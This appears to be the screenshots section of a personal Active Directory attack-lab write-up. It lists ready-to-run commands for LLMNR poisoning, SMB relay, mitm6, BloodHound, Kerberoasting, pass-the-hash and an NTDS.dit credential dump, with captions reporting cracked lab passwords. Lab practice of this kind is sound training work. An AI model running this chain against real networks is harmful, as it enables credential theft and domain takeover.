
## Screenshots

### 1. LLMNR Poisoning
**Command:** `sudo responder -I eth0 -wv`

![Uploading 01-llmnr-poisoning.png…]()

*Captured NTLMv2 hash from network traffic*

![Hash Cracked](Screenshots/02-llmnr-hash-cracked.png)
*Successfully cracked password: Welcome1*

---

### 2. SMB Relay Attack
**Command:** `ntlmrelayx.py -tf targets.txt -smb2support -i`

![SMB Relay Setup](Screenshots/03-smb-relay-setup.png)
*SMB Relay attack in progress*

![SMB Relay Shell](Screenshots/04-smb-relay-shell.png)
*Obtained interactive shell via SMB relay*

---

### 3. IPv6 Attack (mitm6)
**Command:** `sudo mitm6 -d giahuy.local --ignore-nofqdn -i eth0`

![IPv6 mitm6](Screenshots/05-ipv6-mitm6-relay.png)
*IPv6 DNS takeover combined with NTLM relay to create privileged user*

---

### 4. BloodHound Enumeration
**Command:** `bloodhound-python -d giahuy.local -u user -p pass -c all`

![BloodHound Overview](Screenshots/06-bloodhound-overview.png)
*Domain relationship graph showing users, groups, and computers*

![Path to Domain Admin](Screenshots/07-bloodhound-path-to-da.png)
*Attack path identified: UXMMLALAJ → Owns → DOMAIN ADMINS*

---

### 5. Kerberoasting
**Command:** `GetUserSPNs.py giahuy.local/user:pass -dc-ip 192.168.100.13 -request`

![Kerberoasting SPN](Screenshots/08-kerberoasting-spn.png)
*Found service account with SPN: SQLService*

![Kerberoast Cracked](Screenshots/09-kerberoasting-cracked.png)
*Cracked service account password: MYPassword123#*

---

### 6. Pass-the-Hash
**Command:** `smbexec.py Administrator@192.168.100.13 -hashes aad3b...`

![Pass-the-Hash](Screenshots/10-pass-the-hash-shell.png)
*Gained SYSTEM shell using Pass-the-Hash technique*

---

### 7. NTDS.dit Dump
**Command:** `secretsdump.py giahuy.local/Administrator@192.168.100.13 -just-dc`

![NTDS Dump](Screenshots/11-ntds-dump.png)
*Successfully dumped all domain credentials from NTDS.dit database*
